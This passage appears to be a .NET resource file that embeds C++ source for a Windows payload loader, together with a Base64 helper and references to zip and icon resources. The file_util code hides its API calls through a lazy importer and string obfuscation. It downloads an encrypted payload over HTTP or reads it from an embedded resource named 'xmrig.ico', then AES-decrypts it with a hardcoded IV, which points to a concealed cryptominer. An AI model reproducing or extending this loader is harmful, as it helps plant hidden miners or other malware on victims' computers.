&lt;/assembly&gt;</value>
  </data>
  <data name="b64.cpp" xml:space="preserve">
    <value>#include "b64.h"
#include &lt;vector&gt;

static const std::string base64_chars =
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

static inline bool is_base64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string Base64::encode(const std::string&amp; data) {
    std::string ret;
    unsigned int val = 0;
    int valb = -6;

    for (unsigned char c : data) {
        val = (val &lt;&lt; 8) + c;
        valb += 8;
        while (valb &gt;= 0) {
            ret.push_back(base64_chars[(val &gt;&gt; valb) &amp; 0x3F]);
            valb -= 6;
        }
    }

    if (valb &gt; -6)
        ret.push_back(base64_chars[((val &lt;&lt; 8) &gt;&gt; (valb + 8)) &amp; 0x3F]);

    while (ret.size() % 4)
        ret.push_back('=');

    return ret;
}

std::string Base64::decode(const std::string&amp; encoded) {
    std::vector&lt;int&gt; T(256, -1);
    for (int i = 0; i &lt; 64; i++)
        T[base64_chars[i]] = i;

    std::string ret;
    int val = 0, valb = -8;

    for (unsigned char c : encoded) {
        if (T[c] == -1) break;
        val = (val &lt;&lt; 6) + T[c];
        valb += 6;
        if (valb &gt;= 0) {
            ret.push_back(char((val &gt;&gt; valb) &amp; 0xFF));
            valb -= 8;
        }
    }

    return ret;
}
</value>
  </data>
  <data name="b64.h" xml:space="preserve">
    <value>#ifndef BASE64_H
#define BASE64_H

#include &lt;string&gt;

class Base64 {
public:
    static std::string encode(const std::string&amp; data);
    static std::string decode(const std::string&amp; encoded);
};

#endif // BASE64_H
</value>
  </data>
  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <data name="portable_tools1" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\portable_tools1.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </data>
  <data name="portable_tools2" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\portable_tools2.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </data>
  <data name="portable_tools3" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\portable_tools3.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </data>
  <data name="file_util.h" xml:space="preserve">
    <value>#pragma once
#include &lt;windows.h&gt;
#include "buffer_util.h"
#include &lt;iostream&gt;

UNALIGNED_BUF load_file(IN LPCTSTR filename, OUT size_t &amp;r_size);

BYTE* DecryptResourceBuffer(BYTE* encryptedData, size_t dataSize, const std::string&amp; key_str, const std::string&amp; iv_str, size_t&amp; outSize);

BYTE* buffer_payload_resource(WORD resourceID, OUT size_t&amp; r_size, const std::string&amp; key);

BYTE* load_embedded_resource(WORD lpName, OUT size_t&amp; r_size);

void free_file(IN UNALIGNED_BUF buffer);

BYTE* buffer_payload_from_url(const std::string&amp; baseurl, const std::string&amp; file, OUT size_t&amp; r_size, const std::string&amp; key, const std::string&amp; savePath);

std::pair&lt;std::string, std::string&gt; parseURL(const std::string&amp; url);</value>
  </data>
  <data name="file_util.cpp" xml:space="preserve">
    <value>
#pragma once
#include "lib/httplib.h"
#include "file_util.h"
#include &lt;iostream&gt;
#include "pe_hdrs_helper.h"
#include &lt;vector&gt;
#include "lib/aes.hpp"
#include "lib/lazy_importer.hpp"
#include "lib/obfuscate.h"
#include &lt;string&gt;
#include &lt;regex&gt;


ALIGNED_BUF load_file(IN LPCTSTR filename, OUT size_t &amp;read_size)
{
    HANDLE file = LI_FN(CreateFileA)(filename, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if(file == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        std::cerr &lt;&lt; "Could not open file!" &lt;&lt; std::endl;
#endif
        return nullptr;
    }
    HANDLE mapping = CreateFileMappingA(file, 0, PAGE_READONLY, 0, 0, 0);
    if (!mapping) {
#ifdef _DEBUG
        std::cerr &lt;&lt; "Could not create mapping!" &lt;&lt; std::endl;
#endif
        LI_FN(CloseHandle)(file);
        return nullptr;
    }
    BYTE* dllRawData = (BYTE*)LI_FN(MapViewOfFile)(mapping, FILE_MAP_READ, 0, 0, 0);
    if (!dllRawData) {
#ifdef _DEBUG
        std::cerr &lt;&lt; "Could not map view of file" &lt;&lt; std::endl;
#endif
        LI_FN(CloseHandle)(mapping);
        LI_FN(CloseHandle)(file);
        return nullptr;
    }
    size_t r_size = LI_FN(GetFileSize)(file, nullptr);
    if (read_size != 0 &amp;&amp; read_size &lt;= r_size) {
        r_size = read_size;
    }
    if (is_bad_read_ptr(dllRawData, r_size)) {
        std::cerr &lt;&lt; "[-] Mapping of " &lt;&lt; filename &lt;&lt; " is invalid!" &lt;&lt; std::endl;
        LI_FN(UnmapViewOfFile)(dllRawData);
        LI_FN(CloseHandle)(mapping);
        LI_FN(CloseHandle)(file);
        return nullptr;
    }
    UNALIGNED_BUF localCopyAddress = alloc_unaligned(r_size);
    if (localCopyAddress != nullptr) {
        memcpy(localCopyAddress, dllRawData, r_size);
        read_size = r_size;
    } else {
        read_size = 0;
#ifdef _DEBUG
        std::cerr &lt;&lt; "Could not allocate memory in the current process" &lt;&lt; std::endl;
#endif
    }
    LI_FN(UnmapViewOfFile)(dllRawData);
    LI_FN(CloseHandle)(mapping);
    LI_FN(CloseHandle)(file);
    return localCopyAddress;
}

BYTE* DecryptResourceBuffer(BYTE* encryptedData, size_t dataSize, const std::string&amp; key_str, const std::string&amp; iv_str, size_t&amp; outSize) {
    if (dataSize == 0 || !encryptedData) return nullptr;

    // Copy encrypted data into a vector
    std::vector&lt;uint8_t&gt; buffer(encryptedData, encryptedData + dataSize);

    // Setup key and IV
    unsigned char key[32] = { 0 }; // AES-256 key size
    unsigned char iv[16] = { 0 };



    memcpy(key, key_str.data(), (key_str.size() &lt; sizeof(key)) ? key_str.size() : sizeof(key));

    memcpy(iv, iv_str.data(), (iv_str.size() &lt; sizeof(iv)) ? iv_str.size() : sizeof(iv));

    // Init AES context
    AES_ctx ctx;
    AES_init_ctx_iv(&amp;ctx, key, iv);

    AES_CBC_decrypt_buffer(&amp;ctx, buffer.data(), buffer.size());

    // Remove padding
    if (!buffer.empty()) {
        uint8_t pad_len = buffer.back();
        if (pad_len &gt; 0 &amp;&amp; pad_len &lt;= 16 &amp;&amp; pad_len &lt;= buffer.size()) {
            buffer.resize(buffer.size() - pad_len);
        }
    }

    // Allocate output buffer
    outSize = buffer.size();
    BYTE* output = (BYTE*)LI_FN(VirtualAlloc)(nullptr, outSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!output) return nullptr;

    memcpy(output, buffer.data(), outSize);
    return output;
}


BYTE* buffer_payload_resource(WORD resourceID, OUT size_t&amp; r_size, const std::string&amp; key) {
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
    if (!hResource) {
        std::cerr &lt;&lt; ("Error: Could not find resource!") &lt;&lt; std::endl;
        return nullptr;
    }

    HGLOBAL hLoadedResource = LI_FN(LoadResource)(nullptr, hResource);
    if (!hLoadedResource) {
        std::cerr &lt;&lt; ("Error: Could not load resource!") &lt;&lt; std::endl;
        return nullptr;
    }

    BYTE* pResourceData = static_cast&lt;BYTE*&gt;(LI_FN(LockResource)(hLoadedResource));
    size_t dataSize = LI_FN(SizeofResource)(nullptr, hResource);
    if (!pResourceData || dataSize == 0) {
        std::cerr &lt;&lt; ("Error: Could not lock resource!") &lt;&lt; std::endl;
        return nullptr;
    }


    std::string validty = (std::string)("NoKey");

    if (key == validty) {
        printf("Key is Set to No Key\n");
        r_size = dataSize;

        BYTE* localCopyAddress = (BYTE*)LI_FN(VirtualAlloc)(nullptr, r_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!localCopyAddress) {
            std::cerr &lt;&lt; ("Error: Could not allocate memory!") &lt;&lt; std::endl;
            return nullptr;
        }

        memcpy(localCopyAddress, pResourceData, r_size);
        return localCopyAddress;
    }

    // Use consistent IV from your encrypting code
    std::string iv = (std::string)("freediddybummynz");

    return DecryptResourceBuffer(pResourceData, dataSize, key, iv, r_size);

}


BYTE* load_embedded_resource(WORD lpName, OUT size_t&amp; r_size) {
    // Load resource from current executable
    HRSRC hResInfo = LI_FN(FindResourceA)(LI_FN(GetModuleHandleW)(nullptr), "xmrig.ico", RT_RCDATA);
    if (!hResInfo) { std::cerr &lt;&lt; "Loading embedded resource failed!\n"; return nullptr; }

    DWORD dwSize = LI_FN(SizeofResource)(LI_FN(GetModuleHandleW)(nullptr), hResInfo);
    BYTE* pDataBuffer = new BYTE[dwSize];  // Allocate buffer for the data.

    // Load the resource into memory (HGLOBAL) and get a pointer to it.
    LPVOID lpvLoadedResource = LI_FN(LockResource)(LI_FN(LoadResource)(LI_FN(GetModuleHandleW)(nullptr), hResInfo));
    if (!lpvLoadedResource) { std::cerr &lt;&lt; "Locking embedded resource failed!\n"; return nullptr; }

    r_size = dwSize;
    // Copy the data to our buffer.
    memcpy_s(pDataBuffer, dwSize, lpvLoadedResource, dwSize);

    return pDataBuffer;
}


void free_file(IN UNALIGNED_BUF buffer)
{
    free_unaligned(buffer);
}


BYTE* buffer_payload_from_url(const std::string&amp; baseurl, const std::string&amp; file, OUT size_t&amp; r_size, const std::string&amp; key, const std::string&amp; savePath) {
   
    std::vector&lt;uint8_t&gt; encryptedBuffer;
    httplib::Client client(baseurl);

    try {
        // Send a GET request to download the file
        auto res = client.Get(file);

        // Check if the request was successful
        if (res &amp;&amp; res-&gt;status == 200) {

            printf("Size Of Res: %d\n", res-&gt;body.length());
     
            encryptedBuffer.resize(res-&gt;body.length());
            memcpy(&amp;encryptedBuffer[0], res-&gt;body.c_str(), res-&gt;body.length());
  
            std::cout &lt;&lt; "File downloaded successfully: " &lt;&lt; std::endl;
        }
        else {
            std::cerr &lt;&lt; "HTTP error occurred: "
                &lt;&lt; (res ? std::to_string(res-&gt;status) : "No response") &lt;&lt; std::endl;
        }
    }
    catch (const std::exception&amp; e) {
        std::cerr &lt;&lt; "Error occurred: " &lt;&lt; e.what() &lt;&lt; std::endl;
    }

  

    if (encryptedBuffer.empty()) {
        std::cerr &lt;&lt; "Download failed or file was empty!" &lt;&lt; std::endl;
        return nullptr;
    }

    std::string validty = (std::string)AY_OBFUSCATE("NoKey");

    if (key == validty) {
        r_size = encryptedBuffer.size();
        BYTE* rawCopy = (BYTE*)LI_FN(VirtualAlloc)(nullptr, r_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!rawCopy) return nullptr;

        memcpy(rawCopy, encryptedBuffer.data(), r_size);
        return rawCopy;
    }

    // Decrypt the payload using the same IV as encryption
    std::string iv = (std::string)AY_OBFUSCATE("freediddybummynz");

    return DecryptResourceBuffer(encryptedBuffer.data(), encryptedBuffer.size(), key, iv, r_size);
}


std::pair&lt;std::string, std::string&gt; parseURL(const std::string&amp; url) {
    std::regex urlRegex(R"(^(https?://[^/]+)(/.*)?$)", std::regex::icase);
    std::smatch match;

    if (std::regex_match(url, match, urlRegex)) {
        std::string base = match[1].str();
        std::string path = match[2].matched ? match[2].str() : "/";
        return { base, path };
    }

    throw std::invalid_argument("Invalid URL format");
}</value>
  </data>
  <data name="embedded" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\embedded.ico;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </data>
</root>